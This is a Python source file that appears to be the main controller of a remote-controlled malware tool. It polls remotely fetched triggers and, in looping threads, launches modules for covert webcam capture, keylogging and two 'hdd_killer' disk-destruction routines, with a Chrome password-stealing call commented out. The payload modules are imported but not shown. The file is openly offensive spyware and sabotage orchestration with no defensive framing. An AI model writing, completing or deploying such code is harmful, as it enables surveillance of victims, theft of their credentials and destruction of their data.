from threading import Thread
import time
from my_request import get_triggers
from trigger_functions import read_triggers_json
from cam import cam_main
from keylogger import keylogger_main
from hdd_killer_v1 import hdd_killer_v1_main
from hdd_killer_v2 import hdd_killer_v2_main

# from get_chrome_passwords import get_chrome_passwords_main

count = 0
triggers = read_triggers_json()


def kronos():
    global count
    while True:
        time.sleep(1)
        count += 1
        print("Count is:", count)


def update_triggers():
    global triggers
    global count
    while True:
        if count % 10 == 0:
            triggers = get_triggers()
            print("------------------Triggers Updated------------------")
            print(triggers)
            print("----------------------------------------------------")
        time.sleep(1)


def execute_cam(trigger_name):
    global triggers
    if triggers[trigger_name]["active"]:
        cam_main()


def execute_keylogger(trigger_name):
    global triggers
    if triggers[trigger_name]["active"]:
        keylogger_main()


def execute_hdd_killer_v1(trigger_name):
    global triggers
    if triggers[trigger_name]["active"]:
        hdd_killer_v1_main()


def execute_hdd_killer_v2(trigger_name):
    global triggers
    if triggers[trigger_name]["active"]:
        hdd_killer_v2_main()


# def execute_get_chrome_passwords(trigger_name):
#     global triggers
#     if triggers[trigger_name]["active"]:
#         get_chrome_passwords_main()


def execute_triggers():
    global triggers
    while True:
        execute_cam("cam")
        execute_keylogger("keylogger")
        execute_hdd_killer_v1("hdd_killer_v1")
        execute_hdd_killer_v2("hdd_killer_v2")
        # execute_get_chrome_passwords("get_chrome_passwords")


######################################################
t_kronos = Thread(target=kronos)
t_update_triggers = Thread(target=update_triggers)
t_execute_triggers = Thread(target=execute_triggers)
######################################################


if __name__ == "__main__":
    t_kronos.start()
    t_update_triggers.start()
    t_execute_triggers.start()
